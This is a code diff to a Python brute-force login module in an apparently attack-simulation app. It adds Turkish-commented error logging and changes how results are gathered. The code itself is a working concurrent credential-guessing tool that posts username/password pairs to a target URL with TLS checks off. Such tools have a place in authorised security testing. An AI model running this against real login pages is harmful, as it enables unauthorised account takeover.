@@ -1,13 +1,13 @@
-# attack-simulation/app/simulations/brute_force_simulation.py
-
 from app.simulations.simulation_params import BruteForceParams
 from typing import Dict, Any, List, Callable, Coroutine
 import httpx
 import asyncio
+import traceback
 
 async def run_bruteforce_simulation(
     params: BruteForceParams, 
-    progress_callback: Callable[[Dict[str, Any]], Coroutine[Any, Any, None]]
+    progress_callback: Callable[[Dict[str, Any]], Coroutine[Any, Any, None]],
+    simulation_run_id: str
 ) -> Dict[str, Any]:
     print(f"Starting Brute Force Simulation: Target={params.target_url}")
     credentials_found: List[Dict[str, str]] = []
@@ -24,25 +24,30 @@ async def run_bruteforce_simulation(
         nonlocal total_attempts_made
         login_payload = {params.username_field: username, params.password_field: password}
         try:
+            # POST isteğini her zaman str(params.target_url) ile yapalım
             response = await session.post(str(params.target_url), data=login_payload, timeout=15.0, follow_redirects=True)
             success = False
+            response_text_lower = response.text.lower()
+
             if params.success_status_code and response.status_code == params.success_status_code:
                 success = True
-            if not success and params.success_text_indicator and params.success_text_indicator.lower() in response.text.lower():
+            if not success and params.success_text_indicator and params.success_text_indicator.lower() in response_text_lower:
                 success = True
+            
             if success:
-                print(f"Successful Login! User: {username}, Password: {password}")
                 credentials_found.append({"username": username, "password": password})
-                await progress_callback({
-                    "type": "progress", "message": f"SUCCESS! Found credentials for {username}!",
-                    "found": True, "credentials": {"username": username, "password": password}
-                })
+                await progress_callback({ "type": "progress", "message": f"SUCCESS! Found credentials for {username}!" })
                 return True
-        except httpx.RequestError:
-            pass
+        except httpx.RequestError as e:
+            # Ağ hatalarını loglayalım ki görebilelim
+            print(f"Brute force request error for {username}: {e}")
+        except Exception as e:
+            # Diğer beklenmedik hataları da loglayalım
+            print(f"Unexpected error in try_single_login for {username}: {e}")
+            print(traceback.format_exc())
         finally:
             total_attempts_made += 1
-            if total_attempts_made % 10 == 0: # Her 10 denemede bir güncelleme gönder
+            if total_attempts_made % 5 == 0 or total_attempts_made == total_possible_attempts:
                  await progress_callback({
                     "type": "progress", "message": f"Attempt {total_attempts_made}/{total_possible_attempts}...",
                     "completed": total_attempts_made, "total": total_possible_attempts
@@ -57,25 +62,21 @@ async def run_bruteforce_simulation(
     async with httpx.AsyncClient(verify=False) as client:
         for username in params.usernames:
             if simulation_halted: break
-            await progress_callback({
-                "type": "progress", "message": f"Trying passwords for user '{username}'...",
-                "completed": total_attempts_made, "total": total_possible_attempts
-            })
+            
             password_tasks = [worker(client, username, password) for password in params.passwords]
-            results = await asyncio.gather(*password_tasks)
-            if any(res for res in results if isinstance(res, bool) and res):
-                if params.stop_on_first_success:
-                    print(f"Password found, halting simulation.")
-                    simulation_halted = True
-                    break
+            # `gather`'a return_exceptions=True ekleyelim ki görevlerden biri çökerse ana program çökmesin
+            results = await asyncio.gather(*password_tasks, return_exceptions=True)
 
-    await progress_callback({"type": "final_summary", "message": "Brute force simulation completed."})
+            # Hataları kontrol et ve logla
+            for res in results:
+                if isinstance(res, Exception):
+                    print(f"A worker failed with an exception: {res}")
+            
+            # Başarılı sonuçları kontrol et
+            successful_logins = [res for res in results if isinstance(res, bool) and res]
+            if successful_logins and params.stop_on_first_success:
+                simulation_halted = True
+                break
 
-    result = {
-        "target_url": str(params.target_url),
-        "total_attempts_made": total_attempts_made,
-        "credentials_found": credentials_found,
-        "simulation_halted_early": simulation_halted and bool(credentials_found)
-    }
-    print(f"Brute Force Simulation Completed: {result}")
+    result = { "total_attempts_made": total_attempts_made, "credentials_found": credentials_found, "simulation_halted_early": simulation_halted }
     return result
